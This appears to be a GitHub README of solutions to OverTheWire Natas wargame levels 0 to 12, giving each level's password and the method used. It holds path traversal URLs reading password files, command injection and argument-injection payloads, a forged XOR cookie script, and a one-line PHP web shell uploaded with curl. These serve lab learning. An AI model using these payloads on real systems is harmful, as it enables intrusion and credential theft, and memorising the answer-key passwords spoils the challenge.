# NatasChallenge
This is the solution to all Natas levels

### Level 0 [(http://natas0.natas.labs.overthewire.org/)](http://natas0.natas.labs.overthewire.org/)
```
1.View the web page source
2.You will find the natas1 password : g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
```
---
### Level 1 [(http://natas1.natas.labs.overthewire.org/)](http://natas1.natas.labs.overthewire.org/)
```
1.use "view-source" to see the page source like this : view-source:http://natas1.natas.labs.overthewire.org/
2.You will find the natas2 password : h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
```
---
### Level 2 [(http://natas2.natas.labs.overthewire.org/)](http://natas2.natas.labs.overthewire.org/)
```
1.View the page source
2.Go to location of the img tag : '<img src="files/pixel.png">'
3.Go to files directory
4.You will see the users.txt, open it
5.You will see natas3 password : G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
```
---
### Level 3 [(http://natas3.natas.labs.overthewire.org/)](http://natas3.natas.labs.overthewire.org/)
```
1.View the page source, and you see the comment mentioning "No more information leaks!! Not even Google will find it this time..."
2.From the above sentence we understand that google can not find it (it means google robots)
3.Go to robots.txt and you see the "Disallow: /s3cr3t/"
4.Go to "/s3cr3t/" directory and you see the users.txt, open it
5.You will find the natas4 password : tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```
---
### Level 4 [(http://natas4.natas.labs.overthewire.org/)](http://natas4.natas.labs.overthewire.org/)
```
1.The site says you should visit it from a special address
2.Just set the "referer" header with cURL
3.Base64 encode the natas4 credentials -> natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm and put it in "Authorization header"
4.Curl like this : curl http://natas4.natas.labs.overthewire.org/ -H "Authorization: basic bmF0YXM0OnRLT2NKSWJ6TTRsVHM4aGJDbXpuNVpyNDQzNGZHWlFt" -H "referer: http://natas5.natas.labs.overthewire.org/"
5.You will recieve the natas5 password : Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```
---
### Level 5 [(http://natas5.natas.labs.overthewire.org/)](http://natas5.natas.labs.overthewire.org/)
```
1.Curl like this : curl http://natas5.natas.labs.overthewire.org/index.php -H "Authorization: Basic bmF0YXM1OlowTnNydElrSm9LQUxCQ0xpNWVxRmZjUk44MkF1Mm9E" -H "Cookie: loggedin=1"
2.You will get the natas6 password : fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```
---
### Level 6 [(http://natas6.natas.labs.overthewire.org/)](http://natas6.natas.labs.overthewire.org/)
```
1.Curl like this : curl http://natas6.natas.labs.overthewire.org/includes/secret.inc -H "Authorization: Basic bmF0YXM2OmZPSXZFME1EdFBUZ1JocW1tdnZBT3QyRWZYUjZ1UWdS"
2.You will get secret : FOEIUWGHFEEUHOFUOIU
3.Submit the secret and you will get the natas 7 password : jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```
---
### Level 7 [(http://natas7.natas.labs.overthewire.org/)](http://natas7.natas.labs.overthewire.org/)
```
1.Visit the page like this : http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../..//etc/natas_webpass/natas8
2.You will get the natas8 password : a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 
```
---
### Level 8 [(http://natas8.natas.labs.overthewire.org/)](http://natas8.natas.labs.overthewire.org/)
1.Read the source code and reverse the process
```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
$result =  base64_decode(strrev(hex2bin($encodedSecret)));
echo $result;
```
2.You will get the "oubWYf2kBq" submit this secret and you will get the password of natas9 : Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

---
### Level 9 [(http://natas9.natas.labs.overthewire.org/)](http://natas9.natas.labs.overthewire.org/)
```
1.Source code has command injection vulnerability
2.Use this payload : "t; cat /etc/natas_webpass/natas10" to grab the password
3.You will get the password of nata10 : D44EcsFkLxPIkAAKLosx8z3hxX1Z4
```
---
### Level 10 [(http://natas10.natas.labs.overthewire.org/)](http://natas10.natas.labs.overthewire.org/)
```
1.Use this payload to bypass filters : "-v  test /etc/natas_webpass/natas11" or "-r . /etc/natas_webpass/* #"
2.You will get the password of natas11 : 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```
---
### Level 11 [(http://natas11.natas.labs.overthewire.org/)](http://natas11.natas.labs.overthewire.org/)
```
Rule1 : key XOR cleartext = ciphertext
Rule2 : ciphertext XOR cleartext = key
we have ciphertext (cookie)
we get cleartext (step 3)
we generate key (step 4)
```
1.Copy the value of cookie in the browser

2.URL decode and base64 decode the value of cookie taken from step 1 (online cyberchef)

3.Use an online PHP editor and run the following code to get the json encoded value of array :

```php
<?php
echo json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
?> 
```
4.XOR the value of step 2 with value of step 3 (online cyberchef)

5.you will get the key : KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK, the key is KNHL

6.Use this PHP code to generate a new cookie
```php
<?php
$mydata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = 'KNHL';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$result = base64_encode(xor_encrypt(json_encode($mydata)));
echo $result;
?>
```
7.Replace the generated value of step 6 into cookie storage of the browser and refresh

8.You will get the password of natas12 : YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

---
### Level 12 [(http://natas12.natas.labs.overthewire.org/)](http://natas12.natas.labs.overthewire.org/)
```
1.We can upload any file type to the server but when doing that in the browser, the file name is chaned to [filename].jpg according to a hidden field of the form
2.We can upload the file using curl command
```

```bash
3.curl -u "natas12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG" -F "filename=a.php" -F "uploadedfile=@./a.php" http://natas12.natas.labs.overthewire.org
```

![na](https://github.com/Git-K3rnel/NatasChallenge/assets/127470407/6dcae8fa-7be9-401b-bf6b-6886afc47140)

So we uploaded our file with the following code inside :

```php
<?=`$_GET[0]`?>
```
4.Now navigate to `http://natas12.natas.labs.overthewire.org/upload/styy6v78bl.php?0=cat%20/etc/natas_webpass/natas13`

5.You will get the password of natas13 : lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

---
